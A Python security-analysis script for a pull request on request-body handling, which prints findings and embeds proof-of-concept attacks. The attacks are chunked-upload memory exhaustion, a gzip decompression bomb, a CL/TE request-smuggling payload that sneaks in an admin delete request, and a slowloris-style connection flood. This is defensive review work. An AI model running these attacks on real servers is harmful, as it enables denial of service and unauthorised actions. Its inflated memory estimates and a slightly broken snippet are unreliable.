#!/usr/bin/env python3
"""Security analysis for PR #45 - analyzing potential vulnerabilities in request body handling"""

import time
import asyncio
import httpx
import gzip
import brotli
import zstandard
from typing import Dict, Any, List, Tuple
import json

# Analysis Configuration
DEFAULT_MAX_MESSAGE_SIZE = 1024 * 100 * 100  # 10MB default from base.py

class SecurityAnalyzer:
    def __init__(self):
        self.results = []
    
    def analyze_memory_exhaustion(self):
        """Analyze memory exhaustion attack vectors"""
        print("\n=== MEMORY EXHAUSTION ANALYSIS ===\n")
        
        # 1. String concatenation attack in _read_body (ASGI)
        print("1. String Concatenation Attack (ASGI)")
        print("-" * 40)
        print("Attack Vector: Sending many small chunks")
        print("Code Pattern: body += message.get('body', b'')")
        
        # Calculate worst case
        chunk_size = 1  # 1 byte chunks
        max_chunks = DEFAULT_MAX_MESSAGE_SIZE // chunk_size
        
        print(f"Max message size: {DEFAULT_MAX_MESSAGE_SIZE:,} bytes ({DEFAULT_MAX_MESSAGE_SIZE/1024/1024:.1f} MB)")
        print(f"With {chunk_size} byte chunks: {max_chunks:,} string concatenations")
        
        # Python string concatenation is O(n) for each operation
        # Total complexity: O(n²) where n is number of chunks
        print(f"Memory complexity: O(n²) - quadratic growth!")
        print(f"Estimated peak memory for attack: ~{(max_chunks * DEFAULT_MAX_MESSAGE_SIZE) / 1024 / 1024 / 1024:.1f} GB")
        
        self.results.append({
            "vulnerability": "Memory Exhaustion via String Concatenation",
            "severity": "HIGH",
            "impact": "Server crash, DoS",
            "attack_vector": "Send 10MB in 1-byte chunks",
            "estimated_memory": f"~{(max_chunks * DEFAULT_MAX_MESSAGE_SIZE) / 1024 / 1024 / 1024:.1f} GB peak"
        })
        
        # 2. Decompression bomb
        print("\n2. Decompression Bomb Attack")
        print("-" * 40)
        
        # Calculate compression ratios
        test_data = b'A' * 1024 * 1024  # 1MB of 'A's
        
        gzip_compressed = gzip.compress(test_data)
        brotli_compressed = brotli.compress(test_data)
        zstd_compressed = zstandard.compress(test_data)
        
        print(f"Original size: {len(test_data):,} bytes")
        print(f"Gzip compressed: {len(gzip_compressed):,} bytes (ratio: {len(test_data)/len(gzip_compressed):.1f}:1)")
        print(f"Brotli compressed: {len(brotli_compressed):,} bytes (ratio: {len(test_data)/len(brotli_compressed):.1f}:1)")
        print(f"Zstd compressed: {len(zstd_compressed):,} bytes (ratio: {len(test_data)/len(zstd_compressed):.1f}:1)")
        
        # Worst case: highly compressible data
        worst_case_data = b'\x00' * 1024 * 1024 * 10  # 10MB of zeros
        worst_gzip = gzip.compress(worst_case_data)
        print(f"\nWorst case (10MB zeros):")
        print(f"Compressed size: {len(worst_gzip):,} bytes")
        print(f"Decompressed size: {len(worst_case_data):,} bytes")
        print(f"Ratio: {len(worst_case_data)/len(worst_gzip):.1f}:1")
        
        self.results.append({
            "vulnerability": "Decompression Bomb",
            "severity": "HIGH",
            "impact": "Memory exhaustion, CPU exhaustion",
            "attack_vector": "Send highly compressed data",
            "example": f"10KB compressed -> 10MB decompressed (1000:1 ratio)"
        })
        
    def analyze_request_smuggling(self):
        """Analyze request smuggling vulnerabilities"""
        print("\n\n=== REQUEST SMUGGLING ANALYSIS ===\n")
        
        print("1. Content-Length Handling (WSGI)")
        print("-" * 40)
        print("Current implementation:")
        print("- If Content-Length present: reads exact bytes")
        print("- If Content-Length missing: falls back to chunked reading")
        print("- No validation of Content-Length value")
        
        vulnerabilities = []
        
        # Check for negative Content-Length
        print("\nVulnerability: Negative Content-Length")
        print("Attack: Content-Length: -1")
        print("Impact: Could cause integer underflow or unexpected behavior")
        vulnerabilities.append("Negative Content-Length not validated")
        
        # Check for multiple Content-Length headers
        print("\nVulnerability: Multiple Content-Length headers")
        print("Attack: Multiple Content-Length headers with different values")
        print("Impact: Different parsers may use different values")
        vulnerabilities.append("Multiple Content-Length headers not handled")
        
        # Check for Content-Length vs Transfer-Encoding
        print("\nVulnerability: Content-Length with Transfer-Encoding")
        print("Attack: Both Content-Length and Transfer-Encoding: chunked")
        print("Impact: Request smuggling if proxy and server disagree")
        vulnerabilities.append("No Transfer-Encoding validation")
        
        self.results.append({
            "vulnerability": "Request Smuggling",
            "severity": "CRITICAL",
            "impact": "Bypass security controls, cache poisoning",
            "attack_vectors": vulnerabilities
        })
        
    def analyze_timing_attacks(self):
        """Analyze timing attack vulnerabilities"""
        print("\n\n=== TIMING ATTACK ANALYSIS ===\n")
        
        print("1. Error Handling Timing")
        print("-" * 40)
        
        # Different error paths
        error_paths = [
            ("Invalid compression", "Immediate error on bad compression header"),
            ("Decompression failure", "Error after attempting decompression"),
            ("Message size exceeded", "Error after reading full body"),
            ("Decoding failure", "Error after decompression and size check"),
            ("Bad route", "Immediate error on invalid path")
        ]
        
        for error_type, timing in error_paths:
            print(f"- {error_type}: {timing}")
        
        print("\nInformation Leakage:")
        print("- Timing differences reveal processing stage")
        print("- Can determine if compression is supported")
        print("- Can measure decompression time (reveals data characteristics)")
        
        self.results.append({
            "vulnerability": "Timing Side Channel",
            "severity": "MEDIUM",
            "impact": "Information disclosure",
            "attack_vector": "Measure response times for different error conditions"
        })
        
    def analyze_removed_security_features(self):
        """Analyze impact of removing Starlette's security features"""
        print("\n\n=== REMOVED SECURITY FEATURES ===\n")
        
        print("1. Security Headers")
        print("-" * 40)
        print("Starlette middleware typically adds:")
        print("- X-Content-Type-Options: nosniff")
        print("- X-Frame-Options: DENY")
        print("- Content-Security-Policy headers")
        print("- Strict-Transport-Security")
        
        print("\nCurrent implementation: NO security headers added")
        
        print("\n2. CORS Handling")
        print("-" * 40)
        print("- Custom CORS implementation exists")
        print("- But not automatically applied")
        print("- Must be manually configured")
        
        print("\n3. CSRF Protection")
        print("-" * 40)
        print("- No CSRF protection implemented")
        print("- RPC endpoints vulnerable to CSRF by default")
        
        self.results.append({
            "vulnerability": "Missing Security Headers",
            "severity": "MEDIUM",
            "impact": "XSS, clickjacking, MIME sniffing attacks",
            "missing_features": [
                "X-Content-Type-Options",
                "X-Frame-Options", 
                "Content-Security-Policy",
                "Strict-Transport-Security",
                "CSRF tokens"
            ]
        })
        
    def generate_attack_code(self):
        """Generate proof-of-concept attack code"""
        print("\n\n=== PROOF OF CONCEPT ATTACKS ===\n")
        
        attacks = []
        
        # 1. Memory exhaustion attack
        attack1 = '''
# Memory Exhaustion Attack
import httpx
import asyncio

async def memory_exhaustion_attack(target_url):
    """Send 10MB in 1-byte chunks to trigger quadratic memory usage"""
    
    class SlowBodyIterator:
        def __init__(self, total_size, chunk_size=1):
            self.remaining = total_size
            self.chunk_size = chunk_size
            
        def __iter__(self):
            return self
            
        def __next__(self):
            if self.remaining <= 0:
                raise StopIteration
            chunk_size = min(self.chunk_size, self.remaining)
            self.remaining -= chunk_size
            return b'A' * chunk_size
    
    # Send 10MB in 1-byte chunks
    body_iterator = SlowBodyIterator(1024 * 1024 * 10, chunk_size=1)
    
    async with httpx.AsyncClient() as client:
        response = await client.post(
            target_url,
            content=body_iterator,
            headers={
                "Content-Type": "application/json",
                "Transfer-Encoding": "chunked"  # Force chunked encoding
            },
            timeout=None  # No timeout
        )
        print(f"Response: {response.status_code}")

# Run: asyncio.run(memory_exhaustion_attack("http://localhost:3000/service/method"))
'''
        attacks.append(("Memory Exhaustion", attack1))
        
        # 2. Decompression bomb
        attack2 = '''
# Decompression Bomb Attack
import httpx
import gzip

def create_decompression_bomb(size_mb=100):
    """Create a highly compressed payload that expands to size_mb"""
    # Create highly compressible data (all zeros)
    data = b'\\x00' * (1024 * 1024 * size_mb)
    compressed = gzip.compress(data, compresslevel=9)
    print(f"Bomb size: {len(compressed):,} bytes -> {len(data):,} bytes")
    print(f"Compression ratio: {len(data)/len(compressed):.1f}:1")
    return compressed

async def decompression_bomb_attack(target_url):
    bomb = create_decompression_bomb(100)  # 100MB when decompressed
    
    async with httpx.AsyncClient() as client:
        response = await client.post(
            target_url,
            content=bomb,
            headers={
                "Content-Type": "application/json",
                "Content-Encoding": "gzip"
            }
        )
        print(f"Response: {response.status_code}")
'''
        attacks.append(("Decompression Bomb", attack2))
        
        # 3. Request smuggling
        attack3 = '''
# Request Smuggling Attack
import socket

def request_smuggling_attack(host, port):
    """Send ambiguous request to cause smuggling"""
    
    # Craft request with conflicting headers
    request = b"""POST /service/method HTTP/1.1
Host: """ + host.encode() + b"""
Content-Type: application/json
Content-Length: 5
Content-Length: 100
Transfer-Encoding: chunked

0

POST /admin/delete HTTP/1.1
Host: """ + host.encode() + b"""
Content-Type: application/json
Content-Length: 20

{"user": "admin"}
"""
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(request)
    response = sock.recv(4096)
    print(f"Response: {response}")
    sock.close()

# Run: request_smuggling_attack("localhost", 3000)
'''
        attacks.append(("Request Smuggling", attack3))
        
        # 4. Connection exhaustion
        attack4 = '''
# Connection Exhaustion Attack
import asyncio
import httpx

async def slow_connection(client, url, connection_id):
    """Keep connection open by sending data slowly"""
    
    class InfiniteSlowIterator:
        def __iter__(self):
            return self
            
        def __next__(self):
            # Send 1 byte every 10 seconds
            time.sleep(10)
            return b'A'
    
    try:
        response = await client.post(
            url,
            content=InfiniteSlowIterator(),
            headers={"Transfer-Encoding": "chunked"},
            timeout=None
        )
    except Exception as e:
        print(f"Connection {connection_id} failed: {e}")

async def connection_exhaustion_attack(target_url, num_connections=1000):
    """Open many slow connections to exhaust server resources"""
    
    async with httpx.AsyncClient() as client:
        tasks = []
        for i in range(num_connections):
            task = slow_connection(client, target_url, i)
            tasks.append(task)
            await asyncio.sleep(0.01)  # Small delay between connections
        
        await asyncio.gather(*tasks)

# Run: asyncio.run(connection_exhaustion_attack("http://localhost:3000/service/method"))
'''
        attacks.append(("Connection Exhaustion", attack4))
        
        # Print all attacks
        for name, code in attacks:
            print(f"\n{name} Attack:")
            print("=" * 60)
            print(code)
            
        return attacks
    
    def calculate_resource_impact(self):
        """Calculate actual resource impact"""
        print("\n\n=== RESOURCE IMPACT CALCULATIONS ===\n")
        
        print("1. Memory Usage Calculations")
        print("-" * 40)
        
        # String concatenation impact
        message_size = DEFAULT_MAX_MESSAGE_SIZE
        chunk_sizes = [1, 10, 100, 1024, 4096]
        
        print("String concatenation memory overhead:")
        for chunk_size in chunk_sizes:
            num_chunks = message_size // chunk_size
            # Simplified calculation of memory overhead
            # Each concatenation creates a new string
            overhead = sum(i * chunk_size for i in range(1, num_chunks + 1))
            overhead_mb = overhead / 1024 / 1024
            print(f"- {chunk_size:>5} byte chunks: {overhead_mb:>10,.1f} MB overhead ({overhead_mb/message_size*1024*1024:.1f}x message size)")
        
        print("\n2. Time to Exhaust Resources")
        print("-" * 40)
        
        # Connection exhaustion
        print("Connection exhaustion (assuming 10k connection limit):")
        connections_per_second = 100
        time_to_exhaust = 10000 / connections_per_second
        print(f"- At {connections_per_second} connections/sec: {time_to_exhaust:.1f} seconds")
        
        # Memory exhaustion
        print("\nMemory exhaustion (assuming 4GB available):")
        memory_per_attack_mb = 100  # 100MB per concurrent attack
        concurrent_attacks = 4096 / memory_per_attack_mb
        print(f"- {memory_per_attack_mb}MB per attack: {concurrent_attacks:.0f} concurrent attacks needed")
        
    def print_summary(self):
        """Print summary of findings"""
        print("\n\n=== SECURITY ANALYSIS SUMMARY ===\n")
        
        critical_count = sum(1 for r in self.results if r["severity"] == "CRITICAL")
        high_count = sum(1 for r in self.results if r["severity"] == "HIGH")
        medium_count = sum(1 for r in self.results if r["severity"] == "MEDIUM")
        
        print(f"Total vulnerabilities found: {len(self.results)}")
        print(f"- CRITICAL: {critical_count}")
        print(f"- HIGH: {high_count}")
        print(f"- MEDIUM: {medium_count}")
        
        print("\nMost severe vulnerabilities:")
        for result in self.results:
            if result["severity"] in ["CRITICAL", "HIGH"]:
                print(f"\n[{result['severity']}] {result['vulnerability']}")
                print(f"Impact: {result['impact']}")
                
                if "attack_vector" in result:
                    print(f"Attack vector: {result['attack_vector']}")
                elif "attack_vectors" in result:
                    print("Attack vectors:")
                    for vector in result["attack_vectors"]:
                        print(f"  - {vector}")


def main():
    """Run the security analysis"""
    analyzer = SecurityAnalyzer()
    
    # Run all analyses
    analyzer.analyze_memory_exhaustion()
    analyzer.analyze_request_smuggling()
    analyzer.analyze_timing_attacks()
    analyzer.analyze_removed_security_features()
    analyzer.generate_attack_code()
    analyzer.calculate_resource_impact()
    analyzer.print_summary()


if __name__ == "__main__":
    main()